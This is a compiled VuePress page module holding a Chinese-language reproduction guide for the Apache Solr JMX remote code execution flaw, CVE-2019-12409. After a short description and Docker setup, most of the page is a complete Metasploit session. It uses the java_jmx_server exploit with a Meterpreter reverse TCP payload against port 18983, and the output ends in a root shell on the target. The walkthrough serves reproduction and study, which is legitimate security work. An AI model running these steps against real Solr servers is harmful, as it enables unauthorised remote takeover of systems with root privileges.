import{_ as p}from"./plugin-vue_export-helper-c27b6911.js";import{r as o,o as i,c as l,a as n,b as s,d as t,e as a}from"./app-58e4a7d6.js";const c={},r=a(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>Java ManagementExtensions（JMX）是一种Java技术，为管理和监视应用程序、系统对象、设备（如打印机）和面向服务的网络提供相应的工具。JMX 作为 Java的一种Bean管理机制，如果JMX服务端口暴露，那么远程攻击者可以让该服务器远程加载恶意的Bean文件，随着Bean的滥用导致远程代码执行。</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Apache Solr 8.1.1
Apache Solr 8.2.0
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2>`,5),u={href:"http://archive.apache.org/dist/lucene/solr/8.2.0/solr-8.2.0.zip",target:"_blank",rel:"noopener noreferrer"},d=a(`<p>也可以docker搭建</p><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>docker pull solr:8.2.0
docker run --name solr -d -p 8983:8983 -t solr:8.2.0
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div>`,2),v={href:"http://xxx.xxx.xxx.xxx:8983/solr/",target:"_blank",rel:"noopener noreferrer"},m=a(`<h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>查看搭建的Solr是否存在漏洞,查看solr.in.sh配置文件中的ENABLE_REMOTE_JMX_OPTS选项设置是否为“Ture”，如果为Ture，则存在漏洞</p><p>查看漏洞端口18983是否开放</p><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code>nmap xxx<span class="token punctuation">.</span>xxx<span class="token punctuation">.</span>xxx<span class="token punctuation">.</span>xxx <span class="token operator">-</span>p <span class="token number">18983</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091202051.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>root@kali:~/桌面<span class="token comment"># msfconsole</span>
                                                  
     ,           ,
    /             <span class="token punctuation">\\</span>
   <span class="token variable"><span class="token punctuation">((</span>__<span class="token operator">--</span><span class="token operator">-</span><span class="token punctuation">,</span><span class="token punctuation">,</span><span class="token punctuation">,</span><span class="token operator">--</span><span class="token operator">-</span>__<span class="token punctuation">))</span></span>
      <span class="token punctuation">(</span>_<span class="token punctuation">)</span> O O <span class="token punctuation">(</span>_<span class="token punctuation">)</span>_________
         <span class="token punctuation">\\</span> _ /            <span class="token operator">|</span><span class="token punctuation">\\</span>
          o_o <span class="token punctuation">\\</span>   M S F   <span class="token operator">|</span> <span class="token punctuation">\\</span>
               <span class="token punctuation">\\</span>   _____  <span class="token operator">|</span>  *
                <span class="token operator">||</span><span class="token operator">|</span>   WW<span class="token operator">||</span><span class="token operator">|</span>
                <span class="token operator">||</span><span class="token operator">|</span>     <span class="token operator">||</span><span class="token operator">|</span>


       <span class="token operator">=</span><span class="token punctuation">[</span> metasploit v5.0.101-dev                         <span class="token punctuation">]</span>
+ -- --<span class="token operator">=</span><span class="token punctuation">[</span> <span class="token number">2049</span> exploits - <span class="token number">1108</span> auxiliary - <span class="token number">344</span> post       <span class="token punctuation">]</span>
+ -- --<span class="token operator">=</span><span class="token punctuation">[</span> <span class="token number">562</span> payloads - <span class="token number">45</span> encoders - <span class="token number">10</span> nops            <span class="token punctuation">]</span>
+ -- --<span class="token operator">=</span><span class="token punctuation">[</span> <span class="token number">7</span> evasion                                       <span class="token punctuation">]</span>

Metasploit tip: Writing a custom module? After editing your module, why not try the reload <span class="token builtin class-name">command</span>

msf5 <span class="token operator">&gt;</span> use exploit/multi/misc/java_jmx_server
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> No payload configured, defaulting to java/meterpreter/reverse_tcp
msf5 exploit<span class="token punctuation">(</span>multi/misc/java_jmx_server<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> rhost <span class="token number">192.168</span>.51.146
rhost <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">192.168</span>.51.146
msf5 exploit<span class="token punctuation">(</span>multi/misc/java_jmx_server<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> rport <span class="token number">18983</span>
rport <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">18983</span>
msf5 exploit<span class="token punctuation">(</span>multi/misc/java_jmx_server<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> payload java/meterpreter/reverse_tcp
payload <span class="token operator">=</span><span class="token operator">&gt;</span> java/meterpreter/reverse_tcp
msf5 exploit<span class="token punctuation">(</span>multi/misc/java_jmx_server<span class="token punctuation">)</span> <span class="token operator">&gt;</span> options

Module options <span class="token punctuation">(</span>exploit/multi/misc/java_jmx_server<span class="token punctuation">)</span>:

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   JMXRMI        jmxrmi           <span class="token function">yes</span>       The name where the JMX RMI interface is bound
   JMX_PASSWORD                   no        The password to interact with an authenticated JMX endpoint
   JMX_ROLE                       no        The role to interact with an authenticated JMX endpoint
   RHOSTS        <span class="token number">192.168</span>.51.146   <span class="token function">yes</span>       The target host<span class="token punctuation">(</span>s<span class="token punctuation">)</span>, range CIDR identifier, or hosts <span class="token function">file</span> with syntax <span class="token string">&#39;file:&lt;path&gt;&#39;</span>
   RPORT         <span class="token number">18983</span>            <span class="token function">yes</span>       The target port <span class="token punctuation">(</span>TCP<span class="token punctuation">)</span>
   SRVHOST       <span class="token number">0.0</span>.0.0          <span class="token function">yes</span>       The <span class="token builtin class-name">local</span> <span class="token function">host</span> or network interface to listen on. This must be an address on the <span class="token builtin class-name">local</span> machine or <span class="token number">0.0</span>.0.0 to listen on all addresses.
   SRVPORT       <span class="token number">8080</span>             <span class="token function">yes</span>       The <span class="token builtin class-name">local</span> port to listen on.
   SSLCert                        no        Path to a custom SSL certificate <span class="token punctuation">(</span>default is randomly generated<span class="token punctuation">)</span>
   URIPATH                        no        The URI to use <span class="token keyword">for</span> this exploit <span class="token punctuation">(</span>default is random<span class="token punctuation">)</span>


Payload options <span class="token punctuation">(</span>java/meterpreter/reverse_tcp<span class="token punctuation">)</span>:

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  <span class="token number">192.168</span>.51.149   <span class="token function">yes</span>       The listen address <span class="token punctuation">(</span>an interface may be specified<span class="token punctuation">)</span>
   LPORT  <span class="token number">4444</span>             <span class="token function">yes</span>       The listen port


Exploit target:

   Id  Name
   --  ----
   <span class="token number">0</span>   Generic <span class="token punctuation">(</span>Java Payload<span class="token punctuation">)</span>


msf5 exploit<span class="token punctuation">(</span>multi/misc/java_jmx_server<span class="token punctuation">)</span> <span class="token operator">&gt;</span> run

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">192.168</span>.51.149:4444 
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.51.146:18983 - Using URL: http://0.0.0.0:8080/xln8izoCtDUbBVm
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.51.146:18983 - Local IP: http://192.168.51.149:8080/xln8izoCtDUbBVm
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.51.146:18983 - Sending RMI Header<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.51.146:18983 - Discovering the JMXRMI endpoint<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">192.168</span>.51.146:18983 - JMXRMI endpoint on <span class="token number">127.0</span>.1.1:18983
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.51.146:18983 - Proceeding with handshake<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">192.168</span>.51.146:18983 - Handshake with JMX MBean server on <span class="token number">127.0</span>.1.1:18983
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.51.146:18983 - Loading payload<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.51.146:18983 - Replied to request <span class="token keyword">for</span> mlet
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.51.146:18983 - Replied to request <span class="token keyword">for</span> payload JAR
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.51.146:18983 - Executing payload<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.51.146:18983 - Replied to request <span class="token keyword">for</span> payload JAR
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Sending stage <span class="token punctuation">(</span><span class="token number">53944</span> bytes<span class="token punctuation">)</span> to <span class="token number">192.168</span>.51.146
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Meterpreter session <span class="token number">1</span> opened <span class="token punctuation">(</span><span class="token number">192.168</span>.51.149:4444 -<span class="token operator">&gt;</span> <span class="token number">192.168</span>.51.146:56234<span class="token punctuation">)</span> at <span class="token number">2020</span>-11-05 <span class="token number">14</span>:17:04 +0800

                                                                            
meterpreter <span class="token operator">&gt;</span>                                                                 
meterpreter <span class="token operator">&gt;</span> shell                                                            
Process <span class="token number">1</span> created.                                                              
Channel <span class="token number">1</span> created.                                                                
<span class="token function">id</span>                                                                                 
用户id<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> 组id<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> 组<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091202894.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,7);function k(b,h){const e=o("ExternalLinkIcon");return i(),l("div",null,[r,n("p",null,[n("a",u,[s("下载 Apache Solr 8.2.0"),t(e)])]),d,n("p",null,[s("访问 "),n("a",v,[s("http://xxx.xxx.xxx.xxx:8983/solr/"),t(e)]),s(" 正常即可")]),m])}const g=p(c,[["render",k],["__file","Apache Solr JMX服务 RCE CVE-2019-12409.html.vue"]]);export{g as default};
